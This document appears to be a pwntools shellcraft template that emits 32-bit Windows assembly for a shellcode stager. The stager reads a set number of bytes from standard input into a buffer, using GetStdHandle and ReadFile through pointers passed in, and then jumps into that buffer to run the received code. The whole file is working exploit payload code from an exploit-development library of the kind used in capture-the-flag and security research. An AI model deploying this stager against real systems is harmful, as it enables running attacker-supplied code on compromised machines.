<% from pwnlib.shellcraft import common %>
<%page args="ReadFile, GetStdHandle, Size = '0x1000', Target = '0'"/>
<%docstring>
Fucked read because I'm too lazy to do GetProcAddress.
    ReadFile, GetStdHandle, Size = '0x1000', Target = '0'
</%docstring>


    ; EBX = GetStdHandle(STD_INPUT_HANDLE)
        push -10
        mov eax, ${GetStdHandle}
        call [eax]
        mov edi, eax    ; EDI = File

    % if Target == '0':
        jmp PUSH_STAGE
PUSHED_STAGE:
    % else:
        push ${Target}  ; lpBuffer
    % endif
        pop ebx         ; EBX = Buffer Position
        xor ebp, ebp    ; EBP = Total Bytes

        push 0          ; ESI = NumberOfBytesRead
        mov esi, esp

LOOP:
    ; ReadFile(Stdin, Target, 1, &NumberOfBytesRead, 0)
        push 0          ; lpOverlapped
        push esi        ; &(NumberOfBytesRead)
        push 1          ; NumberOfBytesToRead
        push ebx        ; pBuffer
        push edi        ; hFile
        mov eax, ${ReadFile}
        call [eax]

    ; TotalBytes += NumberOfBytesRead
    ; Buffer     += NumberOfBytesRead
        add ebp, [esi]
        add ebx, [esi]

        cmp ebp, ${Size}
        jnz LOOP

        mov ebp, esp
        jmp STAGE

PUSH_STAGE:
        call PUSHED_STAGE
STAGE: